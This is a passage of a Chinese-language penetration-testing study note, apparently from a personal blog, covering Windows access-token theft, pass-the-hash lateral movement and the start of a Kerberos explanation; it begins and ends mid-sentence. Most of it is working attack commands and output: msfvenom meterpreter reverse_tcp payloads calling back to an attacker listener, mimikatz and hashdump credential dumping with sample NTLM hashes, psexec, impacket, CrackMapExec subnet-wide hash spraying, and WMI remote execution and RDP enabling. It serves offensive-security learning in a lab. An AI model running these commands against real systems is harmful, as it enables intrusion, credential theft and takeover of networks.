Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如 U 盾</li></ul><p><strong>windows 环境下的令牌分为两种：</strong></p><ul><li>Delegation Token：授权令牌，它支持交互式会话登录 (例如本地用户直接登录、远程桌面登录访问)</li><li>impersonation Token：模拟令牌，它是非交互的会话 (例如使用 net use 访问共享文件夹)</li></ul><p><strong>注</strong>： 两种 token 只在系统重启后清除，具有 Delegation token 的用户在注销后， 该 Token 将变成 Impersonation token，依旧有效。</p><h3 id="51-access-token的窃取与利用"><a class="markdownIt-Anchor" href="#51-access-token的窃取与利用">#</a> 5.1 Access Token 的窃取与利用</h3><p><strong>Access Token 的窃取与利用需要 administrator 管理员权限。也就是说要<mark>提权</mark>。</strong></p><p>窃取 Access Token 的方法：</p><p><strong>incognito.exe 程序 、InvokeTokenManipulat.ps1 脚本 、MSF 里的 incognito 模块</strong></p><h4 id="1incognitoexe"><a class="markdownIt-Anchor" href="#1incognitoexe">#</a> 1.incognito.exe</h4><p>下载地址：<a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p><p><strong>注：不做免杀会被直接毙</strong></p><ul><li>列出本地 Access Token (需要 administrator 权限)</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">incognito.exe list_tokens -u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220831200116348.png" alt="image-20220831200116348"></p><ul><li>使用 Access Token 模拟其他用户</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">incognito.exe execute -c &quot;完整的 Token 名&quot; cmd.exeincognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exeincognito.exe execute -c &quot;MOONSEC\12SERVER&quot; cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220831200318419.png" alt="image-20220831200318419"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220831200718957.png" alt="image-20220831200718957"></p><h4 id="2msf下的incognito模块"><a class="markdownIt-Anchor" href="#2msf下的incognito模块">#</a> 2…MSF 下的 incognito 模块</h4><ul><li>生成 msf 后门并连接</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">6666</span> <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.115 -f exe -o msf.exemsfconsoleuse exploit/multi/handler<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.0.115<span class="token builtin class-name">set</span> lport <span class="token number">6666</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>使用 incognito 并列举出 token 并窃取令牌</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> use incognitometerpreter <span class="token operator">></span> list_tokens -u <span class="token comment">#列出令牌</span>meterpreter <span class="token operator">></span> impersonate_token <span class="token string">"NT AUTHORITY\SYSTEM"</span> <span class="token comment">#窃取令牌</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220831204341167.png" alt="image-20220831204341167"></p><ul><li>从进程窃取令牌:steal_token PID 命令</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">ps</span> <span class="token comment">#列出进程</span>meterpreter <span class="token operator">></span> steal_token <span class="token number">2544</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220831204539329.png" alt="image-20220831204539329"></p><h4 id="3invoke-tokenmanipulationps1脚本"><a class="markdownIt-Anchor" href="#3invoke-tokenmanipulationps1脚本">#</a> 3.Invoke-TokenManipulation.ps1 脚本</h4><p>下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p><p>这个脚本是 PowerSploit 下 Exfiltration 文件夹内的一个脚本</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">列举token:<span class="token function">Invoke-TokenManipulation</span> <span class="token operator">-</span>Enumerate提权至system:<span class="token function">Invoke-TokenManipulation</span> <span class="token operator">-</span>CreateProcess <span class="token string">"cmd.exe"</span> <span class="token operator">-</span>Username <span class="token string">"nt authoritysystem"</span>复制<span class="token punctuation">(</span>窃取<span class="token punctuation">)</span>进程token:<span class="token function">Invoke-TokenManipulation</span> <span class="token operator">-</span>CreateProcess <span class="token string">"cmd.exe"</span> <span class="token operator">-</span>ProcessId 500复制<span class="token punctuation">(</span>窃取<span class="token punctuation">)</span>线程token:<span class="token function">Invoke-TokenManipulation</span> <span class="token operator">-</span>CreateProcess <span class="token string">"cmd.exe"</span> <span class="token operator">-</span>ThreadId 500<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注：但是复现失败</strong></p><h1 id="横向渗透"><a class="markdownIt-Anchor" href="#横向渗透">#</a> 横向渗透</h1><h2 id="1-pthpass-the-hash传递"><a class="markdownIt-Anchor" href="#1-pthpass-the-hash传递">#</a> 1、PTH (Pass The Hash) 传递</h2><ul><li>PTH：Pass The Hash，在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接 通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码</li><li>pass the hash 原理：<ul><li>在 Windows 系统中，通常会使用 NTLM 身份认证</li><li>NTLM 认证不使用明文口令，而是使用口令加密后的 hash 值，hash 值由系统 API 生成 (例如 LsaLogonUser)</li><li>hash 分为 LM hash 和 NT hash，如果密码长度大于 15，那么无法生成 LM hash。从 Windows Vista 和 Windows Server 2008 开始，微软默认禁用 LM hash</li><li>如果攻击者获得了 hash，就能够在身份验证的时候模拟该用户（即跳过调用 API 生成 hash 的过程）</li></ul></li><li>PTH 攻击适用于：<ul><li>域 / 工作组环境</li><li>可以获得 hash，但是条件不允许对 hash 进行爆破</li><li>内网中存在<mark>和当前机器相同的密码</mark></li></ul></li><li>微软也对 pth 打过补丁，然而在测试中发现，在打了补丁后，常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator (SID 500) 账号例外，利用这个账号仍可以进行 Pass The Hash 远程 IPC 连接</li><li>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功</li><li>从 windows 到 windows 横向 pth 这一类攻击方法比较广泛</li></ul><h3 id="11-mimikatz-pth"><a class="markdownIt-Anchor" href="#11-mimikatz-pth">#</a> 1.1 mimikatz pth</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">privilege::debug <span class="token comment">#启动后进行调试</span>sekurlsa::logonpasswords <span class="token comment">#获取当前主机存在的hash</span>mimikatz.exe <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords"</span> <span class="token string">"exit"</span><span class="token operator">></span> password.txt <span class="token comment">#将获取的信息导出到一个文件中，便于复制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220905183709722.png" alt="image-20220905183709722"></p><ul><li>获取 hash 之后进行下一步的攻击，如切换权限等</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">privilege::debug #调试sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:32ed87bdb5fdc5e9cba88547376818d4 #使用hash连接，可在域内使用其他主机连接本主机dir \\192.168.52.141\c$ #执行成功说  ####实验失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220905183920511.png" alt="image-20220905183920511"></p><h3 id="12-psexec"><a class="markdownIt-Anchor" href="#12-psexec">#</a> 1.2 psexec</h3><ul><li><p>psexec 是 windows 官方自带的，不会存在查杀问题，属于 pstools 利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。</p></li><li><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。 对方开放 445 端口，就相当于开放了 smb 协议</p></li><li><p>由于会建立和删除服务，<mark>会在系统日志中产生记录，容易被溯源</mark></p></li><li><p>工具位于<strong> PSTools</strong> 下</p></li><li><p>psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递</p></li><li><p>明文密码传递：</p></li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PsExec64.exe &#x2F;accepteula &#x2F;s \\192.168.0.123 -u Administrator -p 123456 cmd#-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框#-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shellPsExec.exe &#x2F;accepteula &#x2F;s \\192.168.0.141 -u Administrator -p 123456 cmd &#x2F;c &quot;ipconfig&quot;#直接直接执行回显 -u 域\用户名 -p 密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909102011759.png" alt="image-20220909102011759"></p><ul><li>hash 密文传递：<strong><a href="http://xn--impacketpsexec-2c7vr731c.py">impacket 下的 psexec.py</a></strong> 工具</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">psexec -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 .&#x2F;Administrator@192.168.0.123#hash前面的随便填，后面的一段是NTMLpython3 psexec.py moonsec&#x2F;Administrator@192.168.0.142 #直接登录，执行后输入密码psexec &#x2F;accepteula &#x2F;s \\12server1 -u Administrator -p 123456 cmd #登录主机其他用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909130718598.png" alt="image-20220909130718598"></p><ul><li>使用 psexec 注意事项<ul><li>需要远程系统开启 admin$ 共享（默认是开启的）</li><li>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放<mark> 445</mark> 端口</li><li>在使用 IPC$ 连接目标系统后，不需要输入账户和密码</li><li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务， 命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</li><li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell</li><li>在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能， 只能依靠账号和密码进行传递</li></ul></li></ul><h3 id="13-msf的psexec模块"><a class="markdownIt-Anchor" href="#13-msf的psexec模块">#</a> 1.3 msf 的 psexec 模块</h3><ul><li>生成后门并建立连接</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">6666</span> <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.254.130 -f exe -o msf.exemsfconsolemsf6 <span class="token operator">></span> use exploit/multi/handlermsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.254.130msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lport <span class="token number">6666</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcpmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>导出 hash 值，此动作需要 administrator 用户才可完成</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> hashdump 12server1:1001:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::admin:1002:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::Administrator:500:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>放到后台，使用相关模块</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> backgroundmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> search psexecmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> use exploit/windows/smb/psexecmsf6 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> SMBUSER Administratormsf6 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.254.144 <span class="token comment">#可以设置ip为192.168.0.1/24进行批量pth</span>msf6 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387msf6 exploit<span class="token punctuation">(</span>windows/smb/psexec<span class="token punctuation">)</span> <span class="token operator">></span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909134215264.png" alt="image-20220909134215264"></p><p>注：<strong>关闭防火墙</strong>后测试成功，未关闭防火墙提示超时无法连接。这里是使用本地 hash 之后提权到本地 system，下图为使用同一 hash 碰撞域控服务器</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909134510299.png" alt="image-20220909134510299"></p><h3 id="14-crackmapexec-c段批量pth"><a class="markdownIt-Anchor" href="#14-crackmapexec-c段批量pth">#</a> 1.4 CrackMapExec C 段批量 pth</h3><ul><li>kali 自带工具，项目地址：<a href="https://github.com/byt3bl33d3r/CrackMapExec.git%EF%BC%8Ckali%E5%AE%89%E8%A3%85%E7%9B%B4%E6%8E%A5%E7%94%A8">https://github.com/byt3bl33d3r/CrackMapExec.git，kali 安装直接用</a>  <code>sudo apt install crackmapexec</code></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crackmapexec smb <span class="token number">192.168</span>.254.0/24 -u administrator -H 42e2656ec24331269f82160ff5962387 <span class="token comment">#对C段进行PTH，-H跟NTML</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909140039728.png" alt="image-20220909140039728"></p><h3 id="15-wmi"><a class="markdownIt-Anchor" href="#15-wmi">#</a> 1.5 WMI</h3><ul><li>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具， <mark>Windows 98 以后</mark>的操作系统都支持 WMI</li><li>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些</li></ul><h4 id="wmic命令使用明文"><a class="markdownIt-Anchor" href="#wmic命令使用明文">#</a> wmic 命令 —— 使用明文</h4><ul><li>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目 标主机 C 盘的 ip.txt 文件中</li><li>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口 ( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤ 445 端⼝传回显）</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">wmic &#x2F;node:192.168.254.144 &#x2F;user:administrator &#x2F;password:QWEasd123 process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\ip.txt&quot;#node：IP，user：用户名 password：密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>建立 IPC$，读取回显结果</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">net use \\192.168.254.144\ipc$ &quot;QWEasd123&quot; &#x2F;user:administrator #建立IPctype \\192.168.254.144\c$\ip.txt #读取文件内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909200625078.png" alt="image-20220909200625078"></p><h4 id="wmiexecpy"><a class="markdownIt-Anchor" href="#wmiexecpy">#</a> <a href="http://wmiexec.py">wmiexec.py</a></h4><ul><li>Impacket 工具包下的<mark> wmiexec.py 脚本</mark>，可以用来直接获取 shell</li><li>其他攻击手法可以看下 Readme，这里只对简单的 pth 做一下实验</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387 Administrator@192.168.254.144python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387 Administrator@192.168.254.144 <span class="token string">"whoami"</span><span class="token comment">#不加执行语句可直接获取cmd，加执行语句可返回执行结果</span><span class="token comment">#第一串字符可以随意写</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909201144353.png" alt="image-20220909201144353"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909201307607.png" alt="image-20220909201307607"></p><h4 id="wmiexecvbs"><a class="markdownIt-Anchor" href="#wmiexecvbs">#</a> wmiexec.vbs</h4><ul><li>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：<a href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></li><li>获取 shell</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.254.144 administrator QWEasd123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909201610141.png" alt="image-20220909201610141"></p><ul><li>执行单条命令</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;cmd 192.168.254.144 administrator QWEasd123 &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909201745056.png" alt="image-20220909201745056"></p><h4 id="invoke-wmicommand"><a class="markdownIt-Anchor" href="#invoke-wmicommand">#</a> Invoke-WmiCommand</h4><ul><li>Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利用 Powershell 调用 WMI 来远程执行命令。</li><li>需要以管理员身份运行 powershell</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 导入 Invoke-WmiCommand.ps1 脚本</span><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\<span class="token function">Invoke-WmiCommand</span><span class="token punctuation">.</span>ps1<span class="token comment"># 指定目标系统用户名</span><span class="token variable">$User</span> = <span class="token string">".\administrator"</span><span class="token comment"># 指定目标系统的密码</span><span class="token variable">$Password</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token operator">-</span>String <span class="token string">"QWEasd123"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token comment"># 将账号和密码整合起来，以便导入 Credential</span><span class="token variable">$Cred</span> = <span class="token function">New-Object</span> <span class="token operator">-</span>TypeName System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential-ArgumentList <span class="token variable">$User</span><span class="token punctuation">,</span><span class="token variable">$Password</span><span class="token comment"># 指定要执行的命令和目标 IP，ipconfig处替换为要执行的命令，ip替换为目标IP</span><span class="token variable">$Remote</span> = <span class="token function">Invoke-WmiCommand</span> <span class="token operator">-</span>Payload <span class="token punctuation">&#123;</span>hostname<span class="token punctuation">&#125;</span> <span class="token operator">-</span>Credential <span class="token variable">$Cred</span> <span class="token operator">-</span>ComputerName 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>254<span class="token punctuation">.</span>145<span class="token comment"># 将执行结果输出到屏幕上</span><span class="token variable">$Remote</span><span class="token punctuation">.</span>PayloadOutput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909202245089.png" alt="image-20220909202245089"></p><h4 id="invoke-wmimethod"><a class="markdownIt-Anchor" href="#invoke-wmimethod">#</a> Invoke-WMIMethod</h4><ul><li>Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序，<mark>无需下载脚本</mark></li><li>看不到回显。。。</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 指定目标系统用户名</span><span class="token variable">$User</span>=<span class="token string">".\administrator"</span><span class="token comment"># 指定目标系统密码</span><span class="token variable">$Password</span>=<span class="token function">ConvertTo-SecureString</span> <span class="token operator">-</span>String <span class="token string">"QWEasd123"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token comment"># 将账号和密码整合起来，以便导入 Credential 中</span><span class="token variable">$Cred</span>=<span class="token function">New-Object</span> <span class="token operator">-</span>TypeName System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential <span class="token operator">-</span>ArgumentList <span class="token variable">$User</span><span class="token punctuation">,</span><span class="token variable">$Password</span><span class="token comment"># 在远程系统中运行hostname命令</span><span class="token function">Invoke-WMIMethod</span> <span class="token operator">-</span><span class="token keyword">Class</span> Win32_Process <span class="token operator">-</span>Name Create <span class="token operator">-</span>ArgumentList <span class="token string">"calc.exe"</span> <span class="token operator">-</span>ComputerName <span class="token string">"192.168.254.145"</span> <span class="token operator">-</span>Credential <span class="token variable">$Cred</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909202600198.png" alt="image-20220909202600198"></p><h4 id="wmic的其他命令"><a class="markdownIt-Anchor" href="#wmic的其他命令">#</a> wmic 的其他命令</h4><ul><li>使用 wmic 远程开启目标的 RDP</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 适于 Windows xp、server 2003</span>wmic <span class="token operator">/</span>node:192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>7<span class="token punctuation">.</span>7 <span class="token operator">/</span>user:administrator <span class="token operator">/</span>password:123456 PATH win32_terminalservicesetting WHERE <span class="token punctuation">(</span>__Class!=<span class="token string">""</span><span class="token punctuation">)</span> CALL SetAllowTSConnections 1<span class="token comment"># 适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改为目标的 hostname</span>wmic <span class="token operator">/</span>node:192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>254<span class="token punctuation">.</span>144 <span class="token operator">/</span>user:administrator <span class="token operator">/</span>password:QWEasd123 RDTOGGLEWHERE ServerName=<span class="token string">'12server1'</span> call SetAllowTSConnections 1<span class="token comment">#或者</span>wmic <span class="token operator">/</span>node:192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>254<span class="token punctuation">.</span>144 <span class="token operator">/</span>user:administrator <span class="token operator">/</span>password:QWEasd123 <span class="token keyword">process</span> call create <span class="token string">'cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'</span><span class="token comment">#判断是否开启RDP,0x0开启，0x1关闭</span>REG QUERY <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> <span class="token operator">/</span>v fDenyTSConnections<span class="token comment">#远程重启电脑</span>wmic <span class="token operator">/</span>node:192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>254<span class="token punctuation">.</span>144 <span class="token operator">/</span>user:administrator <span class="token operator">/</span>password:QWEasd123 <span class="token keyword">process</span> call create <span class="token string">"shutdown.exe -r -f -t 0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909210747663.png" alt="image-20220909210747663"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909210851629.png" alt="image-20220909210851629"></p><h2 id="2-pttpass-the-ticket票据传递攻击"><a class="markdownIt-Anchor" href="#2-pttpass-the-ticket票据传递攻击">#</a> 2、PTT (Pass The Ticket) 票据传递攻击</h2><h3 id="21-kerberos协议"><a class="markdownIt-Anchor" href="#21-kerberos协议">#</a> 2.1 Kerberos 协议</h3><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911155128604.png" alt="image-20220911155128604"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911155144972.png" alt="image-20220911155144972"></p><ul><li><p>Kerberos 协议是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。其设计目标是通过密钥系统为客户机与服务器应用程序提供强大的认证服务。该协议的认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥) 执行认证服务的。Kerberos 协议在在内网域渗透领域中至关重要，白银票据、黄金票据、攻击域控等都离不开 Kerberos 协议。</p></li><li><p>为了让阁下能够更轻松地理解后文对认证原理的讲解，你需要先了解以下几个关键角色：</p></li></ul><table><thead><tr><th>角色</th><th>作用</th></tr></thead><tbody><tr><td>Domain Controller</td><td>域控制器，简称 DC，一台计算机，实现用户、计算机的统一管理</td></tr><tr><td>Key Distribution Center</td><td>秘钥分发中心，简称 KDC，默认安装在域控里，包括 AS 和 TGS</td></tr><tr><td>Authentication Service</td><td>身份验证服务，简称 AS，用于 KDC 对 Client 认证</td></tr><tr><td>Ticket Granting Service</td><td>票据授予服务，简称 TGS，用于 KDC 向 Client 和 Server 分发 Session Key（临时秘钥）</td></tr><tr><td>Active Director</td><td>活动目录，简称 AD，用于存储用 户、用户组、域相关的信息</td></tr><tr><td>Client</td><td>客户端：指用户</td></tr><tr><td>Server</td><td>服务端：可能是某台计算机，也可能是某个服务</td></tr></tbody></table><ul><li>打个比方：当 whoami 要和 bunny 进行通信的时候，whoami 就需要向 bunny 证明自己是 whoami，直接的方式就是 whoami 用二人之间的秘密做秘钥加密明文文字生成密文，把密文和明文文字一块发送给 bunny，bunny 再用秘密解密得到明文，把明文和明文文字进行对比，若一致，则证明对方是 whoami</li><li>但是网络中，密文和文字很有可能被窃取，并且只要时间足够，总能破解得到秘钥。所以不能使用这种长期有效的秘钥，要改为短期的临时秘钥。那么这个临时秘钥就需要一个第三方可信任的机构来提供，即 KDC（Key Distribution Center）秘钥分发中心</li></ul><h3 id="22-kerberos认证原理"><a class="markdownIt-Anchor" href="#22-kerberos认证原理">#</a> 2.2 Kerberos 认证原理</h3><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911155923465.png" alt="image-20220911155923465"></p><p>整个认证过程如下：</p><ol><li>首先 Client 向域控制器 DC 请求访问 Server，DC 通过去 AD 活动目录中查找依次区分 Client 来判断 Client 是否可信</li><li>认证通过后返回 TGT 给 Client，Client 得到 TGT（Ticket Granting Ticket）</li><li>Client 继续拿着 TGT 请求 DC 访问 Server，TGS 通过 Client 消息中的 TGT， 判断 Client 是否有访问权限</li><li>如果有，则给 Client 有访问 Server 的权限 Ticket，也叫 ST（Service Ticket）</li><li>Client 得到 Ticket 后，再去访问 Server，且该 Ticket 只针对这一个 